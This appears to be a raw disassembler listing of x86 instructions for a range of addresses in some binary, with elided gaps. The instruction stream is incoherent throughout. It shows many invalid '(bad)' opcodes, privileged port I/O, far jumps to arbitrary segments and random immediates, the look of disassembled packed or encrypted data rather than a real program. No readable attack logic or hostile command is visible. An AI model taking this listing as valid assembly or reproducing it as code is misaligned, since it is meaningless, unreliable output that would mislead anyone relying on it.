  426ca4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ca5:	jmp    0x776e7bdc
  426caa:	pushf  
  426cab:	int3   
  426cac:	not    edi
  426cae:	data16 stc 
  426cb0:	arpl   WORD PTR [eax+ecx*2+0x1e],di
  426cb4:	jp     0x426c85
  426cb6:	aam    0x80
  426cb8:	jmp    0x426cdf
  426cba:	and    al,0x54
  426cbc:	mov    edx,cs
  426cbe:	xchg   ebp,eax
  426cbf:	test   al,0xf2
  426cc1:	pop    edi
  426cc2:	int    0xb0
  426cc4:	stos   DWORD PTR es:[edi],eax
  426cc5:	(bad)  
  426cc7:	arpl   si,di
  426cc9:	mov    cl,0x24
  426ccb:	dec    edx
  426ccc:	in     al,0x49
  426cce:	fcomp  DWORD PTR [eax-0x5b]
  426cd1:	in     al,dx
  426cd2:	push   ds
  426cd3:	pop    ecx
  426cd4:	sbb    DWORD PTR [ebx],eax
  426cd6:	inc    DWORD PTR [esi+eax*1+0x6c25c867]
  426cdd:	les    ebp,FWORD PTR [ebp-0x61]
  426ce0:	add    BYTE PTR [edx+0x2c3ce32],bl
  426ce6:	push   ecx
  426ce7:	or     esp,DWORD PTR [edx-0x39028c04]
  426ced:	cwde   
  426cee:	xchg   edi,eax
  426cef:	ins    DWORD PTR es:[edi],dx
  426cf0:	and    esp,DWORD PTR [esi]
  426cf2:	pop    esp
  426cf3:	pop    ebx
  426cf4:	(bad)  
  426cf5:	in     al,dx
  426cf6:	dec    edx
  426cf7:	ret    0xc7ee
  426cfa:	adc    al,0x77
  426cfc:	xor    eax,0x1a1b23ad
  426d01:	and    BYTE PTR [edi],cl
  426d03:	jmp    0x2b4a:0x526fd488
  426d0a:	stos   DWORD PTR es:[edi],eax
  426d0b:	sub    edx,edx
  426d0d:	xchg   esp,eax
  426d0e:	sbb    eax,0xaa28e72d
  426d13:	xchg   edi,eax
  426d14:	repz dec esi
  426d16:	jecxz  0x426d7f
  426d18:	mov    cl,0xac
  426d1a:	in     eax,0x3a
  426d1c:	rol    bh,cl
  426d1e:	push   eax
  426d1f:	or     BYTE PTR [ebp+0x3814ee6],ch
  426d25:	imul   edx,eax,0x40
  426d28:	ins    BYTE PTR es:[edi],dx
  426d29:	arpl   WORD PTR [edi],bp
  426d2b:	arpl   WORD PTR [esi+0x65],cx
  426d2e:	loope  0x426d18
  426d30:	aas    
  426d31:	jp     0x426d6d
  426d33:	and    eax,0x6dee6d9d
  426d38:	iret   
  426d39:	pop    ebp
  426d3a:	cmp    ch,0x72
  426d3d:	mov    ch,0xd5
  426d3f:	or     BYTE PTR ds:0x40e844ca,bl
  426d45:	sbb    eax,DWORD PTR [edx+0x2419e368]
  426d4b:	mov    bh,0xac
  426d4d:	(bad)  
  426d4e:	(bad)  
  426d4f:	dec    ebp
  426d50:	xor    eax,0x62bc081b
  426d55:	push   ds
  426d56:	or     dl,BYTE PTR [eax+eiz*1+0x2c3e8f87]
  426d5d:	mov    WORD PTR [ebp+0x7e],gs
  426d60:	mov    ds:0x6403aad4,al
  426d65:	shr    DWORD PTR [ecx],1
  426d67:	push   es
  426d68:	rcr    DWORD PTR [edi-0x66],cl
  426d6b:	mov    ebp,0x2c0c62f1
  426d70:	mov    bh,0xdf
  426d72:	sbb    BYTE PTR [edx],ch
  426d74:	cmp    al,BYTE PTR [ecx-0x4f]
  426d77:	iret   
  426d78:	into   
  426d79:	addr16 mov ebp,0xb1738513
  426d7f:	shr    DWORD PTR [esi+edi*2],0xed
  426d83:	retf   0x180
  426d86:	sbb    DWORD PTR [edi],edx
  426d88:	nop
  426d89:	and    al,0xa8
  426d8b:	rcr    BYTE PTR [esi],cl
  426d8d:	dec    ebp
  426d8e:	push   0x764a
	...
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0xc80c:0xc7c2ecf9
  426e01:	inc    eax
  426e02:	cmp    dl,BYTE PTR [edi+0x19fce]
  426e08:	add    eax,0x5f000001
  426e0d:	xchg   esp,eax
  426e0e:	je     0x426dec
  426e10:	dec    ebp
  426e11:	mov    ah,0x67
  426e13:	das    
  426e14:	dec    edx
  426e15:	mov    edx,DWORD PTR [esi-0x28b86d67]
  426e1b:	sub    BYTE PTR [edx-0x32],dh
  426e1e:	push   ds
  426e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e20:	pushf  
  426e21:	repz push esi
  426e23:	mov    eax,0x9f195b3f
  426e28:	push   edi
  426e29:	(bad)  
  426e2a:	mul    BYTE PTR [edx]
  426e2c:	and    eax,esp
  426e2e:	jns    0x426e28
  426e30:	ror    BYTE PTR [eax+0x26],0xde
  426e34:	or     edi,ebx
  426e36:	in     eax,0x5a
  426e38:	(bad)  
  426e39:	inc    BYTE PTR [ebx-0x52552ac]
  426e3f:	mov    dl,BYTE PTR ds:0x6ac4b196
  426e45:	cmp    eax,edi
  426e47:	dec    ecx
  426e48:	enter  0x67e0,0x4a
  426e4c:	imul   BYTE PTR [esi+0x52]
  426e4f:	call   0xe8cdeb8a
  426e54:	popa   
  426e55:	fbstp  TBYTE PTR [ebx]
  426e57:	pop    ebx
  426e58:	cmp    ebp,DWORD PTR cs:[edi+0xb]
  426e5c:	retf   
  426e5d:	mov    ecx,0x483dd90b
  426e62:	jns    0x426e0b
  426e64:	inc    ebx
  426e65:	in     eax,0xe1
  426e67:	xor    ch,BYTE PTR [esi-0x5ca3db5b]
  426e6d:	mov    esi,0xf28e4d29
  426e72:	cdq    
  426e73:	fwait
  426e74:	repnz mov eax,0xbf5280cf
  426e7a:	retf   
  426e7b:	lods   al,BYTE PTR ds:[esi]
  426e7c:	lds    edi,FWORD PTR [esi+0x55eeddb9]
  426e82:	test   DWORD PTR [ecx-0x4d],edx
  426e85:	mov    dl,0xdf
  426e87:	jge    0x426ec2
  426e89:	jb     0x426e7b
  426e8b:	shr    ah,cl
  426e8d:	push   cs
  426e8e:	xor    DWORD PTR [edi],ecx
  426e90:	cmp    eax,0xc4851c0
  426e95:	sti    
  426e96:	cld    
  426e97:	cmp    BYTE PTR [edi-0x50ccd2b1],al
  426e9d:	(bad)  
  426e9e:	iret   
  426e9f:	repnz pop ss
  426ea1:	sub    eax,0xf31ca64e
  426ea6:	dec    edx
  426ea7:	lods   al,BYTE PTR ds:[esi]
  426ea8:	inc    esi
  426ea9:	push   cs
  426eaa:	add    BYTE PTR [ecx+0x6d],bh
  426ead:	or     eax,0x42528a04
  426eb2:	dec    eax
  426eb3:	jl     0x426f01
  426eb5:	fistp  DWORD PTR [edi+edi*1-0x3e]
  426eb9:	add    eax,0xf2cd36cd
  426ebe:	ror    DWORD PTR [ebp-0x26],0x93
  426ec2:	xchg   esp,eax
  426ec3:	add    al,0x33
  426ec5:	mov    eax,ds:0xf671ec8c
  426eca:	leave  
  426ecb:	int3   
  426ecc:	loopne 0x426f25
  426ece:	push   edi
  426ecf:	in     al,dx
  426ed0:	shr    bl,1
  426ed2:	scas   al,BYTE PTR es:[edi]
  426ed3:	les    ecx,FWORD PTR [ebx-0x2e457b8f]
  426ed9:	add    ch,BYTE PTR [ecx-0x602df120]
  426edf:	pop    ebx
  426ee0:	ret    
  426ee1:	inc    esi
  426ee2:	push   edx
  426ee3:	cmp    esi,DWORD PTR [eax+0x31]
  426ee6:	outs   dx,BYTE PTR ds:[esi]
  426ee7:	mov    edx,0xced3fba7
  426eec:	lds    esp,FWORD PTR [eax-0x56]
  426eef:	(bad)  
  426ef0:	mov    ecx,0x6425ade
  426ef5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426ef6:	pop    es
  426ef7:	and    dh,BYTE PTR [ecx]
  426ef9:	mov    ds:0x832e7fd5,eax
  426efe:	fstp   QWORD PTR [ebx-0x5c]
  426f01:	xchg   ecx,eax
  426f02:	mov    bl,0xbf
  426f04:	add    eax,ecx
  426f06:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f07:	mov    bh,0x8d
  426f09:	stos   DWORD PTR es:[edi],eax
  426f0a:	sub    BYTE PTR [edx],bh
  426f0c:	and    DWORD PTR [ebx+0xa9b1f1],esp
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ecx+eax*4-0x2c4f76ca],esp
  426f85:	mov    al,ds:0x1050001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	sahf   
  426f8d:	sub    ah,ch
  426f8f:	jns    0x426f98
  426f91:	lods   eax,DWORD PTR ds:[esi]
  426f92:	mov    edx,DWORD PTR [ecx+ebx*1]
  426f95:	arpl   WORD PTR [edx],bx
  426f97:	(bad)  
  426f99:	call   0x1bf57b1
  426f9e:	mov    cl,0xcf
  426fa0:	pop    esp
  426fa1:	push   edx
  426fa2:	test   eax,0xff2ce2f5
  426fa7:	dec    edi
  426fa8:	mov    WORD PTR [edi+0x9b5e2d2],cs
  426fae:	pop    ss
  426faf:	pop    edi
  426fb0:	add    edi,DWORD PTR [eax-0x579180d0]
  426fb6:	lods   al,BYTE PTR ds:[esi]
  426fb7:	aad    0x69
  426fb9:	mov    esi,0x1f6f5f7c
  426fbe:	imul   edx,DWORD PTR [ebx-0x1fa36325],0xffffffbd
  426fc5:	pop    es
  426fc6:	in     al,0x9a
  426fc8:	aam    0x78
  426fca:	cmp    eax,DWORD PTR [ebx]
  426fcc:	add    BYTE PTR [edx+0x13],ah
  426fcf:	inc    ebx
  426fd0:	clc    
  426fd1:	mov    al,ds:0x2baf293a
  426fd6:	retf   0xec44
  426fd9:	mov    ah,0x58
  426fdb:	out    dx,eax
  426fdc:	pop    edi
  426fdd:	push   0xcca5e5b2
  426fe2:	out    0x64,al
  426fe4:	cmp    al,0x72
  426fe6:	cmp    esp,DWORD PTR [edx-0x3f]
  426fe9:	cmovp  edi,edi
  426fec:	out    0xb1,al
  426fee:	je     0x426fe6
  426ff0:	mov    al,0xbc
  426ff2:	sar    BYTE PTR [ecx-0x7a],1
  426ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426ff6:	scas   al,BYTE PTR es:[edi]
  426ff7:	xchg   ebx,eax
  426ff8:	pop    ss
  426ff9:	or     ebp,esi
  426ffb:	jb     0x427075
  426ffd:	mov    dh,0x89
  426fff:	jne    0x426ff0
  427001:	test   al,0x4e
  427003:	loope  0x426fa3
  427005:	xor    ah,BYTE PTR [ebp-0x551ff5a7]
  42700b:	jae    0x42705d
  42700d:	jbe    0x427005
  42700f:	mov    eax,ds:0x4bf2e077
  427014:	jecxz  0x427080
  427016:	out    dx,eax
  427017:	repz jnp 0x427001
  42701a:	test   DWORD PTR [ecx+0x2501f687],edi
  427020:	ja     0x426fb4
  427022:	add    dl,BYTE PTR ds:0x6ce40362
  427028:	mov    dh,0x56
  42702a:	int    0x8d
  42702c:	fwait
  42702d:	sub    bl,dl
  42702f:	push   edi
  427030:	push   esi
  427031:	add    DWORD PTR [edi-0x6c],esi
  427034:	call   0x70c4:0x7372459e
  42703b:	(bad)  
  42703c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42703d:	shr    BYTE PTR [esi],cl
  42703f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427040:	sub    ebx,ebp
  427042:	test   DWORD PTR [edi-0x1a],esp
  427045:	aad    0x39
  427047:	jle    0x427028
  427049:	adc    bh,bh
  42704b:	arpl   WORD PTR [edi],sp
  42704d:	mov    ds:0xe80641ee,al
  427052:	sbb    edx,DWORD PTR [ebx-0x53]
  427055:	rcl    BYTE PTR [edx-0x2f905e79],1
  42705b:	inc    edx
  42705c:	pop    edi
  42705d:	add    eax,0x55390eef
  427062:	and    al,BYTE PTR [edi+0x1b]
  427065:	pushf  
  427066:	shr    BYTE PTR [esi+edi*1-0x62aa57e1],1
  42706d:	add    dl,al
  42706f:	add    al,0xaf
  427071:	mov    ebx,0x29bb9b74
  427076:	jmp    0x9d24dfcf
  42707b:	shl    BYTE PTR [edx-0x45b8b8f3],0x1
  427082:	mov    BYTE PTR [esi+0x60],ch
  427085:	sbb    BYTE PTR [esi-0x24d1bb90],0xc7
  42708c:	push   edx
  42708d:	or     al,0x4c
  42708f:	push   cs
  427090:	ja     0x427092
	...
  4270f2:	add    BYTE PTR [eax],al
  4270f4:	or     al,0x6d
  4270f6:	sbb    dl,BYTE PTR [ebp-0x2700885]
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xf0039d96
  427102:	ret    0xd849
  427105:	mov    eax,ds:0x1050001
  42710a:	add    BYTE PTR [eax],al
  42710c:	adc    edi,esp
  42710e:	xchg   DWORD PTR [ecx-0x15],ecx
  427111:	shl    ecx,0x2a
  427114:	test   BYTE PTR [edx-0x34],bl
  427117:	pop    es
  427118:	popa   
  427119:	xor    bh,BYTE PTR fs:[edi-0x58]
  42711d:	and    al,0x51
  42711f:	mov    dl,BYTE PTR [esi-0x746f2f36]
  427125:	pop    ds
  427126:	imul   ebp,DWORD PTR [esi+ebx*4-0x38],0x13
  42712b:	dec    esp
  42712c:	ficom  WORD PTR [edi]
  42712e:	sbb    eax,0x7522ee5
  427133:	lods   eax,DWORD PTR ds:[esi]
  427134:	mov    dh,0x2f
  427136:	test   eax,0xf1d1e9da
  42713b:	mov    eax,0x3e089201
  427140:	dec    ebx
  427141:	das    
  427142:	jnp    0x42710c
  427144:	in     eax,dx
  427145:	inc    esi
  427146:	clc    
  427147:	push   ebp
  427148:	out    dx,al
  427149:	push   0x8e607c13
  42714e:	rol    BYTE PTR [ebp-0x11],1
  427151:	cmp    bl,BYTE PTR ds:0x729a4eb7
  427157:	dec    ecx
  427158:	jno    0x427107
  42715a:	arpl   bp,bx
  42715c:	and    dl,bh
  42715e:	and    al,0xa
  427160:	jp     0x4271a0
  427162:	push   edi
  427163:	and    DWORD PTR [eax],0x3f
  427166:	ja     0x42712d
  427168:	sti    
  427169:	add    esp,DWORD PTR [ebx-0x48]
  42716c:	sub    eax,0x789206c
  427171:	inc    edi
  427172:	not    ecx
  427174:	mov    ds:0xe4d4a67c,al
  427179:	sahf   
  42717a:	cmp    DWORD PTR [ebx],ebx
  42717c:	repz mov dh,0xe2
  42717f:	dec    ecx
  427180:	lahf   
  427181:	pop    edi
  427182:	sub    ebp,DWORD PTR [esi-0xf858a27]
  427188:	out    0x40,eax
  42718a:	pop    ebp
  42718b:	mov    dl,0x77
  42718d:	test   DWORD PTR [ebx+0x4b],ebp
  427190:	mov    edx,0x3aa7fa8e
  427195:	aas    
  427196:	outs   dx,BYTE PTR ds:[esi]
  427197:	bnd ss jl 0x42715e
  42719b:	fisubr DWORD PTR [ebx+0xc]
  42719e:	xor    al,0x5f
  4271a0:	hlt    
  4271a1:	inc    edx
  4271a2:	cmp    esp,DWORD PTR [esi+0x7a]
  4271a5:	data16 fcmovnu st,st(5)
  4271a8:	mov    cl,BYTE PTR [ebp-0x7b]
  4271ab:	add    BYTE PTR [ebp+esi*8-0xb318a32],0x97
  4271b3:	scas   eax,DWORD PTR es:[edi]
  4271b4:	out    dx,eax
  4271b5:	daa    
  4271b6:	repnz pusha 
  4271b8:	xchg   esp,eax
  4271b9:	mov    ah,BYTE PTR [edi-0x45d1e073]
  4271bf:	mov    cl,0xa8
  4271c1:	out    dx,eax
  4271c2:	fwait
  4271c3:	loop   0x427231
  4271c5:	shl    DWORD PTR ds:0x1af0d5c0,0x40
  4271cc:	(bad)  
  4271cd:	in     al,0x28
  4271cf:	int3   
  4271d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4271d1:	stc    
  4271d2:	fcomp  DWORD PTR [edi*4+0x2e0a3897]
  4271d9:	dec    esi
  4271da:	(bad)  
  4271dd:	sbb    DWORD PTR [ecx+0x42],ecx
  4271e0:	out    dx,al
  4271e1:	ja     0x4271be
  4271e3:	jb     0x42724c
  4271e5:	repz scas eax,DWORD PTR es:[edi]
  4271e7:	inc    ebp
  4271e8:	pop    ebp
  4271e9:	jae    0x42725a
  4271eb:	sbb    WORD PTR [esi],si
  4271ee:	ror    DWORD PTR [ebx+0x20b50300],cl
  4271f4:	inc    esp
  4271f5:	pop    esp
  4271f6:	shl    BYTE PTR fs:[edx+eax*2],0x82
  4271fb:	fisttp QWORD PTR [eax]
  4271fd:	xchg   ecx,eax
  4271fe:	pop    ebp
  4271ff:	jecxz  0x42719e
  427201:	cmp    dx,WORD PTR [eax-0x37]
  427205:	dec    ecx
  427206:	clc    
  427207:	sbb    eax,0x76496a1b
  42720c:	call   0x0:0xebf2f0de
	...
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x1ead83a6,al
  427284:	frstor [edx+0x1050001]
  42728a:	add    BYTE PTR [eax],al
  42728c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42728d:	mov    DWORD PTR [ecx+eax*1-0x60],esi
  427291:	test   BYTE PTR [ebx+esi*4],bl
  427294:	clc    
  427295:	mov    ebx,0x15236a5f
  42729a:	xchg   esi,eax
  42729b:	xchg   ebp,eax
  42729c:	mov    DWORD PTR [edx],eax
  42729e:	ja     0x4272c6
  4272a0:	shl    BYTE PTR [ecx+esi*4+0x73],0x4
  4272a5:	aas    
  4272a6:	jecxz  0x4272c2
  4272a8:	sub    ebp,esp
  4272aa:	out    0xf4,eax
  4272ac:	mov    ecx,0x58fafe93
  4272b1:	out    dx,al
  4272b2:	push   0xffffff87
  4272b4:	pop    ebx
  4272b5:	mov    edi,0x60a24092
  4272ba:	mov    ebp,0xa6b313cd
  4272bf:	pushf  
  4272c0:	scas   al,BYTE PTR es:[edi]
  4272c1:	std    
  4272c2:	jnp    0x427301
  4272c4:	and    ebp,DWORD PTR [esi+0x67]
  4272c7:	jmp    0x427341
  4272c9:	mov    ah,0x4
  4272cb:	xor    ecx,DWORD PTR [eax+0x216ee3cb]
  4272d1:	in     al,0xda
  4272d3:	sub    ebp,DWORD PTR [eax+0x5e21df85]
  4272d9:	in     eax,dx
  4272da:	popa   
  4272db:	dec    esi
  4272dc:	fisttp DWORD PTR [ecx+0x53d9a359]
  4272e2:	jbe    0x42726c
  4272e4:	or     DWORD PTR [ecx],esi
  4272e6:	inc    esp
  4272e7:	mov    DWORD PTR [ebx+0x5a7e07a1],ebx
  4272ed:	dec    esi
  4272ee:	inc    edx
  4272ef:	xchg   ebp,eax
  4272f0:	aaa    
  4272f1:	popa   
  4272f2:	and    eax,DWORD PTR [ebx+0x7a]
  4272f5:	pop    ecx
  4272f6:	aad    0x8
  4272f8:	dec    esp
  4272f9:	in     al,0x63
  4272fb:	jmp    0x1aa7:0xdb0064d3
  427302:	mov    dh,0x4
  427304:	scas   al,BYTE PTR es:[edi]
  427305:	pop    eax
  427306:	std    
  427307:	out    0xcf,al
  427309:	push   cs
  42730a:	xlat   BYTE PTR ds:[ebx]
  42730b:	data16 and BYTE PTR cs:[esi+0x7],bh
  427310:	push   edi
  427311:	adc    al,0x16
  427313:	ret    0x5ac6
  427316:	cwde   
  427317:	or     eax,0x987075fd
  42731c:	stos   BYTE PTR es:[edi],al
  42731d:	add    DWORD PTR [ebp+0x37dd849c],edx
  427323:	arpl   WORD PTR [ebx],si
  427325:	inc    eax
  427326:	mov    eax,0x4c3cad
  42732b:	(bad)  
  42732c:	out    0x53,eax
  42732e:	sti    
  42732f:	xchg   ebx,eax
  427330:	jb     0x42733f
  427332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427333:	in     eax,0x4c
  427335:	daa    
  427336:	dec    esi
  427337:	icebp  
  427338:	pop    es
  427339:	add    al,0xa0
  42733b:	pop    edi
  42733c:	int    0xd8
  42733e:	cmp    eax,0x1c18eb4b
  427343:	pop    ss
  427344:	icebp  
  427345:	sub    eax,0xf75c2cbd
  42734a:	inc    ebx
  42734b:	stos   DWORD PTR es:[edi],eax
  42734c:	lods   eax,DWORD PTR ds:[esi]
  42734d:	test   BYTE PTR [eax],0x61
  427350:	imul   ebx,DWORD PTR [ecx-0x59],0xb0c07714
  427357:	out    0x7a,al
  427359:	in     al,dx
  42735a:	mov    ds:0x89ed83a2,al
  42735f:	cmp    DWORD PTR [eax],ebp
  427361:	sar    DWORD PTR [edi],1
  427363:	dec    edi
  427364:	mov    eax,ds:0xa9afee91
  427369:	test   DWORD PTR [edi],esi
  42736b:	dec    ebx
  42736c:	ja     0x4273db
  42736e:	cmp    DWORD PTR ds:0x4e3fde5d,ecx
  427374:	cmp    bl,BYTE PTR [ebx-0xc]
  427377:	shr    ch,cl
  427379:	and    DWORD PTR [esi],ecx
  42737b:	ss dec edi
  42737d:	rcr    BYTE PTR [ebx+0x1e],0xf4
  427381:	loopne 0x4273da
  427383:	inc    ebp
  427384:	(bad)  
  427385:	test   eax,0xff3c9866
  42738a:	dec    ecx
  42738b:	inc    edi
  42738c:	pop    edi
  42738d:	lahf   
  42738e:	pop    esi
  42738f:	stc    
  427390:	mov    eax,DWORD PTR [eax]
	...
  4273f2:	add    BYTE PTR [eax],al
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    esi,DWORD PTR [ecx+0x6f]
  427402:	sbb    al,0x9
  427404:	loop   0x4273a9
  427406:	add    DWORD PTR [eax],eax
  427408:	add    eax,0xde000001
  42740d:	ds cwde 
  42740f:	ror    BYTE PTR [eax+0x5ecf39c4],0x1a
  427416:	sbb    ch,BYTE PTR [esp+ebx*1+0x535de01c]
  42741d:	mov    eax,0xeb2b71b5
  427422:	pop    ecx
  427423:	or     BYTE PTR [ecx-0x5d],ah
  427426:	fsubr  DWORD PTR [edx-0x74f840e9]
  42742c:	mov    edi,0xb4801e3d
  427431:	test   BYTE PTR [ebx],dl
  427433:	sub    eax,0x67f269a0
  427438:	adc    BYTE PTR [bx+di-0x66],dh
  42743c:	popa   
  42743d:	mov    ebp,0x505446c0
  427442:	scas   al,BYTE PTR es:[edi]
  427443:	dec    ebp
  427444:	dec    ebp
  427445:	jecxz  0x427415
  427447:	push   es
  427448:	pop    ebx
  427449:	ror    BYTE PTR [eax],0xb5
  42744c:	repnz bound esp,QWORD PTR [ebx]
  42744f:	xchg   ecx,eax
  427450:	or     esi,ecx
  427452:	fild   WORD PTR [ecx]
  427454:	test   eax,0xc2f29d2e
  427459:	ret    0x447
  42745c:	cld    
  42745d:	bound  edx,QWORD PTR [ecx]
  42745f:	xchg   ebp,eax
  427460:	xor    ebx,DWORD PTR [ebp*8+0x33123681]
  427467:	call   0xe07d59aa
  42746c:	push   0xffffffa0
  42746e:	addr16 call 0xd86c405d
  427474:	stc    
  427475:	mov    WORD PTR [esp+eiz*2-0x4c0c0944],?
  42747c:	loop   0x4274c8
  42747e:	sub    eax,DWORD PTR [edi+ebx*2]
  427481:	sar    BYTE PTR [esi+eiz*8-0x6c],0xc5
  427486:	sub    DWORD PTR ds:0x76d61e8d,0x46
  42748d:	imul   edx,DWORD PTR [ebp-0x3433ad25],0xffffffe0
  427494:	mov    edi,0x92ccc94a
  427499:	jg     0x427473
  42749b:	dec    edx
  42749c:	push   cs
  42749d:	aas    
  42749e:	cld    
  42749f:	dec    eax
  4274a0:	mov    ch,0x46
  4274a2:	xchg   ebp,ecx
  4274a4:	enter  0x77db,0xf4
  4274a8:	cmp    eax,0x8145b669
  4274ad:	pop    ebx
  4274ae:	or     cl,bl
  4274b0:	enter  0xcf2a,0x83
  4274b4:	xor    ah,BYTE PTR [edi-0xda5029c]
  4274ba:	adc    BYTE PTR [eax-0x57],bl
  4274bd:	call   0xc4e5:0x6cd2b118
  4274c4:	repz sub ebx,ecx
  4274c7:	inc    esp
  4274c8:	push   esp
  4274c9:	sub    BYTE PTR [edx-0x21935082],bh
  4274cf:	inc    edi
  4274d0:	fistp  QWORD PTR cs:[ebx-0x5758ecf0]
  4274d7:	stc    
  4274d8:	mov    edi,0xb0a5d81a
  4274dd:	int3   
  4274de:	iret   
  4274df:	jns    0x427474
  4274e1:	or     dh,BYTE PTR [edx+ebp*8-0x3a]
  4274e5:	xor    eax,0x19845923
  4274ea:	rcl    DWORD PTR [edx+0x52583115],0x57
  4274f1:	lods   al,BYTE PTR ds:[esi]
  4274f2:	dec    ebp
  4274f3:	or     dh,BYTE PTR ds:0xfb05ff89
  4274f9:	xor    al,0x37
  4274fb:	leave  
  4274fc:	add    BYTE PTR [eax+0x4993f663],dh
  427502:	pop    ds
  427503:	leave  
  427504:	and    DWORD PTR [ecx-0x766d6a1a],ecx
  42750a:	mov    esi,0x8c3d6a8c
  42750f:	inc    WORD PTR [eax]
	...
  427572:	add    BYTE PTR [eax],al
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	std    
  427581:	dec    edx
  427582:	or     DWORD PTR ds:0x1a4e7,edi
  427588:	add    eax,0x69000001
  42758d:	jge    0x427548
  42758f:	sbb    esi,DWORD PTR [edi]
  427591:	leave  
  427592:	and    BYTE PTR [ebp-0x8],bl
  427595:	lea    eax,[edi+0x7e]
  427598:	sar    DWORD PTR [edi-0x2eca5914],cl
  42759e:	cmp    eax,0xe53c34c8
  4275a3:	call   0x902ddd28
  4275a8:	mov    eax,0xb8a35b90
  4275ad:	push   ecx
  4275ae:	cmp    eax,0x4122eec2
  4275b3:	push   ss
  4275b4:	mov    edx,0x8d0cb3cd
  4275b9:	leave  
  4275ba:	inc    ebx
  4275bb:	mov    edx,0xf7a734b4
  4275c0:	add    eax,0x11cb109a
  4275c5:	daa    
  4275c6:	xchg   ecx,eax
  4275c7:	nop
  4275c8:	mov    edx,0xbf5a9b3
  4275cd:	dec    ecx
  4275ce:	xlat   BYTE PTR ds:[ebx]
  4275cf:	inc    esi
  4275d0:	mov    esp,DWORD PTR [esi]
  4275d2:	ins    BYTE PTR es:[edi],dx
  4275d3:	sbb    bh,dl
  4275d5:	lahf   
  4275d6:	add    edi,DWORD PTR ds:0x1ffa864e
  4275dc:	jp     0x42765b
  4275de:	xchg   edi,eax
  4275df:	xchg   DWORD PTR [ecx+0x5cce55a3],ebx
  4275e5:	sub    al,0x66
  4275e7:	add    BYTE PTR [edx+0x3a],al
  4275ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4275eb:	mov    ?,WORD PTR [esi-0x3631aa0d]
  4275f1:	jo     0x4275c0
  4275f3:	out    dx,eax
  4275f4:	push   ecx
  4275f5:	std    
  4275f6:	adc    al,0x55
  4275f8:	and    esi,DWORD PTR [ecx+0x7]
  4275fb:	dec    ecx
  4275fc:	xchg   esi,eax
  4275fd:	push   esp
  4275fe:	(bad)  
  4275ff:	jp     0x4275fb
  427601:	fisub  WORD PTR [eax]
  427603:	sti    
  427604:	jg     0x4275a9
  427606:	jb     0x427659
  427608:	jbe    0x4275c8
  42760a:	aam    0x64
  42760c:	jmp    0x4275aa
  42760e:	jl     0x427687
  427610:	call   0xdc15:0xa2fcd59c
  427617:	mov    ebx,0x3a429658
  42761c:	adc    al,0x50
  42761e:	cld    
  42761f:	mov    ds,WORD PTR [eax]
  427621:	popf   
  427622:	jnp    0x427662
  427624:	adc    eax,0x1b0fbc96
  427629:	jnp    0x427672
  42762b:	pop    edx
  42762c:	sahf   
  42762d:	fidivr WORD PTR [ecx+0x6016f5ad]
  427633:	mov    ah,0x2b
  427635:	mov    cl,0x6c
  427637:	mov    ah,0x45
  427639:	xor    eax,0xe830e818
  42763e:	add    BYTE PTR [ecx],bh
  427640:	or     ah,ah
  427642:	xlat   BYTE PTR ds:[ebx]
  427643:	sbb    al,0xc5
  427645:	cmp    eax,0x41567eaf
  42764a:	mov    al,ds:0x63516fbf
  42764f:	fiadd  WORD PTR [edi]
  427651:	int3   
  427652:	ds push es
  427654:	ret    
  427655:	inc    edx
  427656:	rcl    DWORD PTR [eax-0x38],0x6d
  42765a:	mov    bh,0x4d
  42765c:	adc    eax,0x93d12f88
  427661:	neg    esi
  427663:	push   esp
  427664:	push   0x7f
  427666:	fimul  WORD PTR [eax+0x5e604d4b]
  42766c:	dec    ecx
  42766d:	inc    ebx
  42766e:	sub    BYTE PTR [edx],dl
  427670:	ret    
  427671:	ins    BYTE PTR es:[edi],dx
  427672:	push   eax
  427673:	and    al,BYTE PTR [ecx]
  427675:	add    eax,ebx
  427677:	inc    edi
  427678:	imul   BYTE PTR [edi]
  42767a:	aaa    
  42767b:	pop    es
  42767c:	mov    ebx,es
  42767e:	mov    ebx,ecx
  427680:	mov    dl,0xe1
  427682:	pusha  
  427683:	les    ebx,FWORD PTR [ebx]
  427685:	clc    
  427686:	ror    BYTE PTR [edi],1
  427688:	daa    
  427689:	sti    
  42768a:	retf   
  42768b:	in     eax,0xa4
  42768d:	cmc    
  42768e:	mov    ds:0x1de0,al
	...
  4276f3:	add    BYTE PTR [ecx],al
  4276f5:	push   esi
  4276f6:	nop
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fnstcw WORD PTR [edx-0x135a0128]
  427705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    eax,0xfb000001
  42770d:	push   ecx
  42770e:	int    0x3f
